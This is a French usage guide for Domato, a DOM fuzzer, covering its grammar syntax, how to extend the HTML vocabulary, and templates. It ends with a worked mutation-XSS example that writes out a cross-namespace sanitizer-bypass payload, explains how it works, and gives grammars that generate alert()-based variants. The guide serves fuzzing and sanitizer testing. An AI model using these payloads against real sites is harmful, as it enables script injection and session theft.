# Domato — Guide d'utilisation

Domato est un fuzzer de DOM développé par Google Project Zero. Il génère des fichiers HTML aléatoires mais structurellement valides à partir de grammaires formelles, dans le but de découvrir des bugs dans les moteurs de rendu (Chrome, Firefox, Safari, etc.).

---

## Architecture générale

```
domuto/
├── grammar.py          # Moteur de grammaire (parser + générateur)
├── generator.py        # Point d'entrée — charge la grammaire et lance la comparaison
├── diff_compare.py     # Comparateur différentiel (Firefox/DOMParser, PHP DOM, Lexbor)
└── rules/
    ├── html.txt        # Grammaire HTML complète (éléments, attributs, structure)
    ├── mxss.txt        # Grammaire mXSS (payloads de mutation ciblés)
    ├── myhtml.txt      # Grammaire HTML simplifiée (tags ouvrants uniquement)
    ├── common.txt      # Symboles partagés (couleurs, entiers, noms de tags)
    ├── css.txt         # Grammaire CSS (chargée comme import pour html.txt)
    ├── attributevalues.txt  # Valeurs possibles pour chaque attribut HTML
    ├── tagattributes.txt    # Attributs applicables par tag
    ├── svg.txt / svgattrvalues.txt
    └── mathml.txt / mathmlattrvalues.txt
```

---

## Lancement

```bash
# Lancer 500 comparaisons avec la grammaire par défaut (html.txt)
PYTHONMALLOC=malloc .venv/bin/python generator.py

# Changer la grammaire
.venv/bin/python generator.py --grammar mxss.txt

# Changer le nombre d'itérations
.venv/bin/python generator.py --count 10000

# Changer le nombre d'éléments générés par itération
.venv/bin/python generator.py --per-run 5
```

---

## Syntaxe des fichiers de grammaire

### Règle de base

```
<symbole> = texte littéral avec <autresymbole> imbriqué
```

Chaque ligne définit une production pour un symbole. Plusieurs lignes pour le même symbole = choix aléatoire parmi les alternatives (distribution uniforme par défaut).

### Types intégrés

| Tag | Description | Attributs optionnels |
|-----|-------------|----------------------|
| `<int>` | Entier signé 32 bits | `min=`, `max=` |
| `<int8>` `<uint8>` … `<uint64>` | Entiers typés | `min=`, `max=`, `b` (binaire LE), `be` (binaire BE) |
| `<float>` `<double>` | Flottants | `min=`, `max=` |
| `<char>` | Un caractère | `min=`, `max=` (code ASCII), `code=` |
| `<string>` | Chaîne aléatoire | `min=`, `max=` (bornes ASCII), `minlength=`, `maxlength=` |
| `<htmlsafestring>` | Chaîne HTML-escapée | mêmes attributs que `<string>` |
| `<hex>` | Un chiffre hexadécimal | `up` (majuscule) |
| `<lines count=N>` | N lignes de code JS générées | — |
| `<import from=fichier symbol=X>` | Expansion depuis une grammaire importée | `symbol=` optionnel (root sinon) |

### Constantes d'échappement

| Token | Caractère produit |
|-------|-------------------|
| `<lt>` | `<` |
| `<gt>` | `>` |
| `<hash>` | `#` |
| `<cr>` | `\r` (CR) |
| `<lf>` | `\n` (LF) |
| `<space>` | espace |
| `<tab>` | tabulation |
| `<ex>` | `!` |

Ces constantes sont indispensables pour produire du balisage HTML sans conflit avec la syntaxe de la grammaire.

Exemple — élément `<div>` avec attributs et contenu :

```
<HTMLDivElement> = <lt>div <div_attributes> <attributes><gt><innerelements><lt>/div<gt>
```

### Directives

```
!include fichier.txt          # Inclure un autre fichier de grammaire inline
!import fichier.txt           # Importer comme grammaire séparée (accessible via <import from=...>)
!varformat var%05d            # Format des noms de variables JS générées
!lineguard try { <line> } catch(e) {}   # Guard autour de chaque ligne de code
!max_recursion 50             # Profondeur maximale de récursion
!var_reuse_prob 0.75          # Probabilité de réutiliser une variable existante
!extends NomType NomParent    # Déclarer un héritage de type (pour la réutilisation de variables)
```

### Contrôle des probabilités

Par défaut, toutes les alternatives d'un symbole sont équiprobables. On peut pondérer :

```
<symbol p=0.7> = alternative fréquente
<symbol p=0.2> = alternative rare
<symbol>       # probabilité automatique = 1 - 0.7 - 0.2 = 0.1
```

Si la somme dépasse 1, les probabilités sont normalisées.

### Règles non-récursives

Le moteur détecte les règles récursives (le symbole gauche apparaît dans le membre droit). Quand la profondeur maximale est approchée, il bascule automatiquement vers les règles marquées `nonrecursive` :

```
<innerelements nonrecursive=true p=0.5> = <htmlsafestring min=32 max=126>
<innerelements> = <newline><element><newline>
<innerelements> = <newline><element><newline><element><newline>
```

La probabilité `p=0.5` ici fixe la fréquence de la variante non-récursive même hors limite.

### Symbole racine

```
<monsymbole root=true> = ...
```

Désigne le symbole d'entrée que `generate_root()` expansera en premier.

### Sections de code (génération JS)

```
!begin lines
<new HTMLElement> = document.createElement("<tagname>")
!end lines

!begin helperlines
// lignes non comptabilisées dans le quota
!end helperlines
```

Dans les sections `lines`, les tags `<new Type>` déclarent la création d'une variable du type donné. Ces variables sont ensuite réutilisées dans les lignes suivantes selon `_var_reuse_prob`.

### Fonctions Python embarquées

```
!begin function mafonction
ret_val = attributes['x'] + '_processed'
!end function

<monsymbole> = <autrechose beforeoutput=mafonction>
```

L'attribut `beforeoutput` appelle la fonction Python sur la valeur expansée juste avant de l'insérer dans le résultat.

---

## Ajouter du vocabulaire HTML

### 1. Ajouter un nouvel élément HTML

**Étape 1** — Enregistrer le type DOM dans `html_tags.py` :

```python
_HTML_TYPES = {
    # ...
    'details': 'HTMLDetailsElement',
    # Ajouter :
    'monelement': 'HTMLMonElement',
}
```

**Étape 2** — Définir la règle de production dans `rules/html.txt` :

```
<HTMLMonElement> = <lt>monelement <monelement_attributes> <attributes><gt><innerelements><lt>/monelement<gt>
```

**Étape 3** — Ajouter l'élément au sélecteur `<element>` dans `rules/html.txt` :

```
<element> = <HTMLMonElement>
```

**Étape 4** — Définir les attributs spécifiques dans `rules/tagattributes.txt` :

```
<monelement_attribute> = <attribute_class>
<monelement_attribute> = <attribute_id>
<monelement_attribute> = <attribute_style>
<monelement_attributes> = <monelement_attribute> <monelement_attribute> <monelement_attribute> <monelement_attribute> <monelement_attribute>
```

La convention `<tagname_attributes>` (pluriel) doit produire exactement 5 attributs — c'est la convention systématique de la grammaire existante.

### 2. Ajouter un nouvel attribut

**Étape 1** — Déclarer les valeurs possibles dans `rules/attributevalues.txt` :

```
<monattribut_value> = valeur1
<monattribut_value> = valeur2
<monattribut_value> = <attributestring>   # valeur aléatoire
```

**Étape 2** — Déclarer l'attribut dans `rules/html.txt` :

```
<attribute_monattribut> = monattribut="<monattribut_value>"
```

**Étape 3** — L'ajouter au pool global d'attributs (optionnel — s'applique à tous les éléments) :

```
<attribute> = <attribute_monattribut>
```

**Étape 4** — L'associer aux éléments concernés dans `rules/tagattributes.txt` :

```
<div_attribute> = <attribute_monattribut>
<span_attribute> = <attribute_monattribut>
```

### 3. Étendre les valeurs d'un attribut existant

Dans `rules/attributevalues.txt`, les symboles existants peuvent simplement être augmentés :

```
# Attribut sandbox existant
<sandbox_value> = allow-scripts
<sandbox_value> = allow-same-origin
# Ajouter :
<sandbox_value> = allow-downloads
<sandbox_value> = allow-top-navigation-by-user-activation
```

---

## Construction de payloads imbriqués

La récursion dans la grammaire est le mécanisme central pour produire des structures HTML complexes.

### Hiérarchie de nesting native

```
<bodyelements>
  └── <element> × 10
        └── <HTMLDivElement>
              └── <innerelements>        # peut recurser
                    └── <element>
                          └── <HTMLTableElement>
                                └── <tablechildren>
                                      └── <tablechild>
                                            └── <HTMLTableSectionElement>
                                                  └── <trelements>
                                                        └── <HTMLTableRowElement>
```

### Ajouter une structure imbriquée personnalisée

Pour créer un conteneur qui peut accueillir des éléments enfants spécifiques :

```
# Définir les enfants possibles
<monconteneur_children> = <innerelements>
<monconteneur_children nonrecursive=true p=0.3> = <htmlsafestring min=32 max=126>
<monconteneur_children> = <newline><HTMLSpecialChild><newline>
<monconteneur_children> = <newline><HTMLSpecialChild><newline><HTMLSpecialChild><newline>

# Utiliser dans la règle de l'élément
<HTMLMonConteneur> = <lt>monconteneur <monconteneur_attributes> <attributes><gt><monconteneur_children><lt>/monconteneur<gt>
```

### Imbrication cross-namespace (HTML + SVG + MathML)

La grammaire supporte nativement l'imbrication HTML/SVG/MathML. `<element>` peut produire `<svgelement_svg>` ou `<mathmlelement_math>`, et à l'intérieur du SVG, certains éléments peuvent contenir du `<foreignObject>` qui revient à du HTML.

Pour exploiter cette imbrication dans une règle personnalisée :

```
<monconteneur_children> = <innerelements>
<monconteneur_children> = <newline><svgelement_svg><newline>
<monconteneur_children> = <newline><mathmlelement_math><newline>
```

### Contrôle de la profondeur de nesting

La profondeur maximale est contrôlée par `!max_recursion` (défaut : 50). Augmenter cette valeur produit des arbres plus profonds mais ralentit la génération et peut provoquer des `RecursionError` Python.

```
!max_recursion 30    # arbres moins profonds, génération plus rapide
!max_recursion 100   # arbres plus profonds, plus de stress sur le parseur
```

Quand la limite est atteinte, le moteur bascule automatiquement sur les règles `nonrecursive`. Si aucune règle non-récursive n'existe pour un symbole, une `RecursionError` est levée (catchée et loguée en avertissement).

---

## Template HTML

Le fichier `template.html` contient les trois placeholders suivants :

| Placeholder | Remplacement |
|-------------|--------------|
| `<cssfuzzer>` | Règles CSS générées (1 bloc) |
| `<htmlfuzzer>` | Éléments HTML générés |
| `<jsfuzzer>` | Code JS généré (1000 lignes pour le premier, 500 pour les suivants) |

Le template peut contenir plusieurs occurrences de `<jsfuzzer>` — chacune est remplie indépendamment. Le premier appel génère 1000 lignes (`_N_MAIN_LINES`), les suivants 500 (`_N_EVENTHANDLER_LINES`).

Les éléments HTML dans `<htmlfuzzer>` reçoivent automatiquement des attributs `id` (ex: `htmlvar00001`) via `add_html_ids()`, et des variables JS correspondantes sont injectées en tête de chaque bloc `<jsfuzzer>`.

### Template minimal personnalisé

```html
<html>
<head>
<style><cssfuzzer></style>
<script>
function go() {
  <jsfuzzer>
}
</script>
</head>
<body onload="go()">
<htmlfuzzer>
</body>
</html>
```

---

## Import de grammaires externes

Deux mécanismes coexistent — ils diffèrent par le nom sous lequel la grammaire est accessible.

### `!import` — depuis la grammaire

```
!import css.txt
```

La grammaire est enregistrée sous son **basename** (`css.txt`). Pour l'utiliser :

```
<mystyle> = style="<import from=css.txt symbol=property>"
```

### `add_import` — depuis Python

```python
cssgrammar = Grammar()
cssgrammar.parse_from_file('rules/css.txt')
htmlgrammar.add_import('cssgrammar', cssgrammar)
```

La grammaire est enregistrée sous le **nom choisi** (`cssgrammar`). Pour l'utiliser dans la grammaire :

```
<mystyle> = style="<import from=cssgrammar symbol=property>"
```

Les deux approches sont équivalentes mais le nom de référence dans `<import from=...>` doit correspondre exactement au nom d'enregistrement. C'est `add_import` qui est utilisé dans `generator.py` pour charger `css.txt` sous le nom `cssgrammar`.

---

## Points notables

### Identifiants `id` dans l'attribut

L'attribut `id` (`<attribute_id>`) est commenté dans `html.txt` :

```
#<attribute_id> = id="<id_value>"
```

Ceci est intentionnel : les IDs sont assignés automatiquement par `add_html_ids()` dans `generator.py` pour établir la correspondance entre éléments HTML et variables JS. Activer cette règle briserait ce mécanisme.

### L'attribut `action` des formulaires est désactivé

```
#<action_value> = <attributestring>
```

Les URL dans `action` pourraient provoquer des requêtes réseau réelles lors du fuzzing. Ce choix préserve l'isolation du test.

### Réutilisation de variables JS

Le paramètre `_var_reuse_prob = 0.75` signifie que 75% du temps, quand une variable du type requis existe déjà dans le contexte, elle est réutilisée au lieu d'en créer une nouvelle. Ceci favorise les interactions entre objets DOM déjà créés, ce qui est plus intéressant pour trouver des bugs de cycle de vie.

### Héritage de types

```
!extends HTMLInputElement HTMLElement
!extends HTMLDivElement HTMLElement
```

Déclarer un héritage permet à une variable de type `HTMLInputElement` d'être proposée dans les contextes qui acceptent `HTMLElement`. Cela augmente la densité des interactions entre types compatibles.

### Lignes "intéressantes"

Le moteur maintient une liste de lignes JS "intéressantes" — celles qui utilisent un type de variable déjà présent dans le contexte. Avec `_interesting_line_prob = 0.9`, 90% des lignes générées sont choisies parmi ces lignes intéressantes, maximisant les interactions DOM réelles plutôt que les créations d'objets isolées.

---

## Exemple complet — payload mXSS cross-namespace

### Payload cible

```html
<form><math><mtext></form><form><mglyph><svg><mi><textarea><path is="</textarea><img src onerror=alert(origin)>">
```

### Technique exploitée

Ce payload est un exemple classique de **mutation XSS (mXSS)** par confusion de namespaces. Il exploite les transitions de parseur entre HTML, MathML et SVG :

1. `<form>` ouvre un formulaire en namespace HTML.
2. `<math>` fait basculer le parseur en namespace MathML.
3. `<mtext>` est un élément MathML dont le contenu est repassé au parseur HTML (foreign content re-entry).
4. `</form>` ferme le formulaire HTML extérieur depuis l'intérieur de `<mtext>`.
5. `<form>` ouvre un second formulaire, toujours dans `<mtext>`.
6. `<mglyph>` est un élément MathML qui force un retour en mode HTML intégré.
7. `<svg>` bascule en namespace SVG.
8. `<mi>` est interprété comme MathML à l'intérieur du SVG (comportement ambigu selon les implémentations).
9. `<textarea>` en contexte SVG est traité comme un élément raw-text : son contenu jusqu'à `</textarea>` est consommé verbatim.
10. `<path is="</textarea>...">` : la valeur de l'attribut `is` contient `</textarea>`, qui lors d'une re-sérialisation/re-parse ferme la textarea et injecte `<img src onerror=alert(origin)>`.

L'effet mXSS se produit lorsqu'un sanitiseur sérialise puis re-parse ce HTML : la structure change entre les deux passes, laissant passer la balise `<img>` avec son gestionnaire `onerror`.

### Grammaire domato minimale

```
# [PAI] BEGIN — grammaire minimale pour le payload mXSS cross-namespace

# Valeur de l'attribut is : contient </textarea> suivi du vecteur XSS.
# <lt> et <gt> produisent les caractères littéraux < et > dans la sortie.
<is_mxss_value> = <lt>/textarea<gt><lt>img src onerror=alert(origin)<gt>

# Payload complet — une seule règle racine suffit.
<payload root=true> = <lt>form<gt><lt>math<gt><lt>mtext<gt><lt>/form<gt><lt>form<gt><lt>mglyph<gt><lt>svg<gt><lt>mi<gt><lt>textarea<gt><lt>path is="<is_mxss_value>"<gt>

# [PAI] END
```

**Sortie produite :**

```html
<form><math><mtext></form><form><mglyph><svg><mi><textarea><path is="</textarea><img src onerror=alert(origin)>">
```

### Points clés de cette grammaire

- **`<lt>` / `<gt>`** sont indispensables partout où la sortie doit contenir un chevron littéral — que ce soit pour ouvrir une balise ou à l'intérieur d'une valeur d'attribut. Sans eux, domato interpréterait `<` et `>` comme des délimiteurs de symbole.

- **La valeur de `is`** est construite en deux sous-symboles pour la clarté, mais peut s'écrire en une seule règle inline. Le moteur substitue `<is_mxss_value>` avant d'écrire la valeur entre guillemets — aucun HTML-escaping n'est appliqué à ce stade, les chevrons passent tels quels dans la sortie.

- **`root=true`** sur `<payload>` désigne ce symbole comme point d'entrée. `generate_root()` démarre l'expansion depuis lui.

- **Pas de `<attributes>`** ici : les attributs génériques sont omis pour garder le payload exact. Dans un contexte de fuzzing réel, on pourrait ajouter `<attributes>` sur les éléments qui le supportent pour augmenter la couverture.

### Variante avec alternatives aléatoires

Pour générer une famille de payloads autour de cette structure tout en conservant l'effet mXSS :

```
# Vecteurs XSS alternatifs après fermeture de textarea
<xss_vector> = <lt>img src onerror=alert(origin)<gt>
<xss_vector> = <lt>svg onload=alert(1)<gt>
<xss_vector> = <lt>details open ontoggle=alert(1)<gt>

# Valeur de is avec vecteur variable
<is_mxss_value> = <lt>/textarea<gt><xss_vector>

# Structure de base invariante
<payload root=true> = <lt>form<gt><lt>math<gt><lt>mtext<gt><lt>/form<gt><lt>form<gt><lt>mglyph<gt><lt>svg<gt><lt>mi<gt><lt>textarea<gt><lt>path is="<is_mxss_value>"<gt>
```

Domato choisira aléatoirement parmi les trois vecteurs à chaque génération.
